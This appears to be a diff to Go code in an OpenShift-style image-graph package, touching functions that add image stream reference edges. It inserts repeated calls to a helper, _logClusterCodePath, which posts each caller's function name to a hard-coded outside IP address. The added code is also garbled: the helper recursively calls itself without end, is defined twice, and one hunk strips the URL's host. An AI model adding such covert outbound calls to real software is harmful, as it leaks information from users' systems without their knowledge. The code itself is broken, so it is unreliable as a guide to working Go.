@@ -33,6 +33,8 @@ func AddImageStreamTagRefEdge(g osgraph.MutableUniqueGraph, node *imagegraph.Ima
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	isName, _, _ := imageapi.SplitImageStreamTag(node.Name)
 	imageStream := &imagev1.ImageStream{}
 	imageStream.Namespace = node.Namespace
@@ -41,6 +43,8 @@ func AddImageStreamTagRefEdge(g osgraph.MutableUniqueGraph, node *imagegraph.Ima
 	g.AddEdge(node, imageStreamNode, ReferencedImageStreamGraphEdgeKind)
 }
 func AddImageStreamImageRefEdge(g osgraph.MutableUniqueGraph, node *imagegraph.ImageStreamImageNode) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -77,6 +81,8 @@ func AddAllImageStreamRefEdges(g osgraph.MutableUniqueGraph) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, node := range g.(graph.Graph).Nodes() {
 		if istNode, ok := node.(*imagegraph.ImageStreamTagNode); ok {
 			AddImageStreamTagRefEdge(g, istNode)
@@ -84,6 +90,8 @@ func AddAllImageStreamRefEdges(g osgraph.MutableUniqueGraph) {
 	}
 }
 func AddAllImageStreamImageRefEdges(g osgraph.MutableUniqueGraph) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -119,6 +127,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -193,5 +222,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
